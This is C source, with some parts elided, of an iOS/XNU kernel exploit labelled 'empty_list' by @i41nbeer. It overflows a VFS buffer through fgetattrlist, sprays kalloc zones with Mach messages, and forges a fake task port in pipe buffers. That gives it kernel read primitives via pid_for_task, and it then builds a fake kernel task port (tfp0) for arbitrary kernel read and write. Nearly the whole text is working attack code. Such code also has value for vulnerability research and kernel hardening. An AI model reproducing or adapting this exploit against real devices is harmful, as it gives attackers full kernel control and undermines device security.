...
#include "empty_list_kmem.h"

void empty_list_increase_limits() {
    struct rlimit lim = {0};
...
void empty_list_build_fake_task_port(uint8_t* fake_port, uint64_t fake_port_kaddr, uint64_t initial_read_addr, uint64_t vm_map, uint64_t receiver, uint64_t context) {
    // clear the region we'll use:
    memset(fake_port, 0, 0x500);
    
    *(uint32_t*)(fake_port+empty_list_koffset(KSTRUCT_OFFSET_IPC_PORT_IO_BITS)) = IO_BITS_ACTIVE | IKOT_TASK;
    *(uint32_t*)(fake_port+empty_list_koffset(KSTRUCT_OFFSET_IPC_PORT_IO_REFERENCES)) = 0xf00d; // leak references
    *(uint32_t*)(fake_port+empty_list_koffset(KSTRUCT_OFFSET_IPC_PORT_IP_SRIGHTS)) = 0xf00d; // leak srights
    *(uint64_t*)(fake_port+empty_list_koffset(KSTRUCT_OFFSET_IPC_PORT_IP_RECEIVER)) = receiver;
    *(uint64_t*)(fake_port+empty_list_koffset(KSTRUCT_OFFSET_IPC_PORT_IP_CONTEXT)) = context;
    
    
    uint64_t fake_task_kaddr = fake_port_kaddr + 0x100;
    *(uint64_t*)(fake_port+empty_list_koffset(KSTRUCT_OFFSET_IPC_PORT_IP_KOBJECT)) = fake_task_kaddr;
    
    uint8_t* fake_task = fake_port + 0x100;
    
    // set the ref_count field of the fake task:
    *(uint32_t*)(fake_task + empty_list_koffset(KSTRUCT_OFFSET_TASK_REF_COUNT)) = 0xd00d; // leak references
    
    // make sure the task is active
    *(uint32_t*)(fake_task + empty_list_koffset(KSTRUCT_OFFSET_TASK_ACTIVE)) = 1;
    
    // set the vm_map of the fake task:
    *(uint64_t*)(fake_task + empty_list_koffset(KSTRUCT_OFFSET_TASK_VM_MAP)) = vm_map;
    
    // set the task lock type of the fake task's lock:
    *(uint8_t*)(fake_task + empty_list_koffset(KSTRUCT_OFFSET_TASK_LCK_MTX_TYPE)) = 0x22;
    
    // set the bsd_info pointer to be 0x10 bytes before the desired initial read:
    *(uint64_t*)(fake_task + empty_list_koffset(KSTRUCT_OFFSET_TASK_BSD_INFO)) = initial_read_addr - 0x10;
}

int empty_list_message_size_for_kalloc_size(int kalloc_size) {
...
mach_port_t kalloc_16() {
    ...
    uint32_t msg_size = empty_list_message_size_for_kalloc_size(0x110);
...
void do_vfs_overflow() {
    int options = 0;
    fgetattrlist(vfs_fd, &al, attrBuf, attrBufSize, options);
}
...
mach_port_t empty_list_early_read_port = MACH_PORT_NULL;
...
void empty_list_prepare_early_read_primitive(mach_port_t target_port, int read_fd, int write_fd, uint64_t known_kaddr) {
    empty_list_early_read_port = target_port;
    early_read_read_fd = read_fd;
    early_read_write_fd = write_fd;
    early_read_known_kaddr = known_kaddr;
}

uint32_t empty_list_early_rk32(uint64_t kaddr) {
    uint8_t* buf = malloc(0xfff);
    read(early_read_read_fd, buf, 0xfff);
    empty_list_build_fake_task_port(buf, early_read_known_kaddr, kaddr, 0, 0, 0);
    write(early_read_write_fd, buf, 0xfff);
    
    uint32_t val = 0;
    kern_return_t err = pid_for_task(empty_list_early_read_port, &val);
    if (err != KERN_SUCCESS) {
...
uint64_t empty_list_early_rk64(uint64_t kaddr) {
    uint64_t lower = (uint64_t)empty_list_early_rk32(kaddr);
    uint64_t upper = (uint64_t)empty_list_early_rk32(kaddr + 4);
    uint64_t final = lower | (upper << 32);
    return final;
}

uint64_t empty_list_task_port_kaddr;
kern_return_t empty_list_go() {
    printf("empty_list by @i41nbeer\n");
    empty_list_offsets_init();
    
    start_spinners();
    printf("vfs_sploit\n");
    empty_list_increase_limits();
...
#define N_COLLECTABLES 3
    ...
    replacer_object[empty_list_koffset(KSTRUCT_OFFSET_IPC_PORT_IP_CONTEXT)/8] = canary_port;
    ...
    empty_list_build_fake_task_port(pipe_buf, pipe_target_kaddr, pipe_target_kaddr, 0, 0, 0);
    ...
    for (int i = 0; i < n_gc_ports; i++) {
        ...
        for (int j = 0; j < 8; j++) {
            ...
            for (int k = 0; k < 0x1f; k++) {
                ...
                mach_port_t tester_port = ool_ports[empty_list_koffset(KSTRUCT_OFFSET_IPC_PORT_IP_CONTEXT)/8];
        ...
        if (!hit_dangler) {
            ...
            for (int i = 0; i < (0x1f*8); i++) {
                ...
                empty_list_build_fake_task_port(pipe_buf, pipe_target_kaddr, pipe_target_kaddr, 0, 0, next_pipe_index);
    ...
    for (int i = 0; i < next_pipe_index; i++) {
        ...
        empty_list_build_fake_task_port(new_contents, pipe_target_kaddr, pipe_target_kaddr+4, 0, 0, 0);
    ...
    empty_list_prepare_early_read_primitive(target_port, read_ends[pipe_target_kaddr_replacer_index], write_ends[pipe_target_kaddr_replacer_index], pipe_target_kaddr);
    ...
    uint64_t host_kmsg = empty_list_early_rk64(canary_port_kaddr + empty_list_koffset(KSTRUCT_OFFSET_IPC_PORT_IKMQ_BASE));
    printf("host_kmsg: %016llx\n", host_kmsg);
    
    // hexdump the kmsg:
    //for (int i = 0; i < 100; i++) {
    //  uint64_t val = empty_list_early_rk64(host_kmsg + (i*8));
    //  printf("%016llx: %016llx\n", host_kmsg + (i*8), val);
    //}
    uint64_t host_port_kaddr = empty_list_early_rk64(host_kmsg + 0xac); // could parse the message to find this rather than hardcode
    ...
    uint64_t task_kmsg = empty_list_early_rk64(canary_port_kaddr + empty_list_koffset(KSTRUCT_OFFSET_IPC_PORT_IKMQ_BASE));
    printf("task_kmsg: %016llx\n", task_kmsg);
    
    
    empty_list_task_port_kaddr = empty_list_early_rk64(host_kmsg + 0xac);
    
    printf("our task port is at %016llx\n", empty_list_task_port_kaddr);
    ...
    uint64_t ipc_space_kernel = empty_list_early_rk64(host_port_kaddr + empty_list_koffset(KSTRUCT_OFFSET_IPC_PORT_IP_RECEIVER));
    ...
    for (int i = 0; i < ports_per_zcram; i++) {
        ...
        uint32_t io_bits = empty_list_early_rk32(early_port_kaddr + empty_list_koffset(KSTRUCT_OFFSET_IPC_PORT_IO_BITS));
        ...
        uint64_t task_t = empty_list_early_rk64(early_port_kaddr + empty_list_koffset(KSTRUCT_OFFSET_IPC_PORT_IP_KOBJECT));
        if (task_t == 0) {
        ...
        uint64_t bsd_info = empty_list_early_rk64(task_t + empty_list_koffset(KSTRUCT_OFFSET_TASK_BSD_INFO));
        if (bsd_info == 0) {
            printf("task doesn't have a bsd info\n");
            continue;
        }
        uint32_t pid = empty_list_early_rk32(bsd_info + empty_list_koffset(KSTRUCT_OFFSET_PROC_PID));
        if (pid != 0) {
            printf("task isn't the kernel task\n");
        }
        
        // found the right task, get the vm_map
        kernel_vm_map = empty_list_early_rk64(task_t + empty_list_koffset(KSTRUCT_OFFSET_TASK_VM_MAP));
        break;
    }
    ...
    uint64_t task_kaddr = empty_list_early_rk64(empty_list_task_port_kaddr + empty_list_koffset(KSTRUCT_OFFSET_IPC_PORT_IP_KOBJECT));
    uint64_t itk_space = empty_list_early_rk64(task_kaddr + empty_list_koffset(KSTRUCT_OFFSET_TASK_ITK_SPACE));
    uint64_t is_table = empty_list_early_rk64(itk_space + empty_list_koffset(KSTRUCT_OFFSET_IPC_SPACE_IS_TABLE));
    
    const int sizeof_ipc_entry_t = 0x18;
    uint64_t target_port_kaddr = empty_list_early_rk64(is_table + ((target_port >> 8) * sizeof_ipc_entry_t));
    ...
    empty_list_build_fake_task_port(fake_tfp0_buf, target_port_kaddr, 0x4242424243434343, kernel_vm_map, ipc_space_kernel, 0x1234);
    ...
    empty_list_prepare_for_rw_with_fake_tfp0(fake_tfp0);
    ...
    empty_list_wk64(is_table + ((fake_canary_port >> 8) * sizeof_ipc_entry_t), 0);
    empty_list_wk64(is_table + ((fake_canary_port >> 8) * sizeof_ipc_entry_t) + 8, 0);
    ...
    // struct proc:
    uint64_t proc_addr = empty_list_rk64(task_kaddr + empty_list_koffset(KSTRUCT_OFFSET_TASK_BSD_INFO));
    
    // struct filedesc
    uint64_t filedesc = empty_list_rk64(proc_addr + empty_list_koffset(KSTRUCT_OFFSET_PROC_P_FD));
    
    // base of ofiles array
    uint64_t ofiles_base = empty_list_rk64(filedesc + empty_list_koffset(KSTRUCT_OFFSET_FILEDESC_FD_OFILES));
    
    uint64_t ofiles_offset = ofiles_base + (target_port_read_fd * 8);
    
    // struct fileproc
    uint64_t fileproc = empty_list_rk64(ofiles_offset);
    
    // struct fileglob
    uint64_t fileglob = empty_list_rk64(fileproc + empty_list_koffset(KSTRUCT_OFFSET_FILEPROC_F_FGLOB));
    
    // struct pipe
    uint64_t pipe = empty_list_rk64(fileglob + empty_list_koffset(KSTRUCT_OFFSET_FILEGLOB_FG_DATA));
    
    // clear the inline struct pipebuf
    printf("clearing pipebuf: %llx\n", pipe);
    empty_list_wk64(pipe + 0x00, 0);
    empty_list_wk64(pipe + 0x08, 0);
    empty_list_wk64(pipe + 0x10, 0);
    
    // do the same for the other end:
    ofiles_offset = ofiles_base + (target_port_write_fd * 8);
    
    // struct fileproc
    fileproc = empty_list_rk64(ofiles_offset);
    
    // struct fileglob
    fileglob = empty_list_rk64(fileproc + empty_list_koffset(KSTRUCT_OFFSET_FILEPROC_F_FGLOB));
    
    // struct pipe
    pipe = empty_list_rk64(fileglob + empty_list_koffset(KSTRUCT_OFFSET_FILEGLOB_FG_DATA));
    ...
    printf("[INFO]: empty_list_go: done.\n");
    sleep(3);
    return KERN_SUCCESS;
}
